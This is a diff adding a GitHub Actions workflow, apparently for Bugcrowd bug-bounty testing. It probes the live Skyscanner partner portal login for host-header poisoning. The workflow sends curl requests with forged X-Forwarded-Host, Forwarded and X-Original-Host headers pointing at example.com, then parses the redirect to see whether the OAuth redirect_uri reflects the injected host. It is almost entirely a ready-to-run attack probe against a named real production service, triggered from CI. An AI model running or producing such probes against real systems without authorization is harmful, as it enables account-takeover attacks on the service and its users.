@@ -1,0 +1,52 @@
+name: Bugcrowd Skyscanner Partner Portal Host Poison V33
+
+on:
+  push:
+    paths:
+      - '.github/workflows/bugcrowd-skyscanner-partnerportal-host-poison-v33.yml'
+  workflow_dispatch:
+
+jobs:
+  host-poison:
+    runs-on: ubuntu-latest
+    timeout-minutes: 8
+    steps:
+      - name: Check whether proxy host headers influence OAuth redirect_uri
+        shell: bash
+        run: |
+          set -euo pipefail
+          HDR='Skyscanner-Security: Bugcrowd'
+          UA='Mozilla/5.0 Bugcrowd-Research-Skyscanner-HostPoison/1.0'
+          URL='https://partnerportal.skyscanner.net/authenticate/login?returnUrl=%2F'
+
+          req() {
+            name="$1"; shift
+            echo "=== $name ==="
+            curl -sS --max-time 20 \
+              -H "$HDR" -H "User-Agent: $UA" "$@" \
+              -D "/tmp/$name.h" -o "/tmp/$name.b" "$URL" || true
+            grep -Ei '^(HTTP/|location:|set-cookie:|x-service|x-gateway|content-type:)' "/tmp/$name.h" | head -n 60 || true
+            python3 - "$name" <<'PY'
+          import sys,re,urllib.parse
+          n=sys.argv[1]
+          h=open(f'/tmp/{n}.h','r',errors='replace').read()
+          m=re.search(r'(?im)^location:\s*(.+)$',h)
+          if not m:
+              print('NO_LOCATION'); raise SystemExit
+          loc=m.group(1).strip()
+          print('LOCATION_HOST=',urllib.parse.urlsplit(loc).netloc)
+          qs=urllib.parse.parse_qs(urllib.parse.urlsplit(loc).query)
+          for k in ('redirect_uri','client_id','state','nonce','code_challenge','returnUrl'):
+              if k in qs:
+                  print(k,'=',qs[k])
+          print('EXTERNAL_HOST_PRESENT=', 'example.com' in loc.lower())
+          PY
+          }
+
+          req baseline
+          req xfh -H 'X-Forwarded-Host: example.com'
+          req xfhost_port -H 'X-Forwarded-Host: example.com:443'
+          req forwarded -H 'Forwarded: host=example.com;proto=https'
+          req xoriginal -H 'X-Original-Host: example.com'
+          req xforwardedproto -H 'X-Forwarded-Proto: http' -H 'X-Forwarded-Host: example.com'
+          echo 'V33_HOST_POISON_DONE=1'
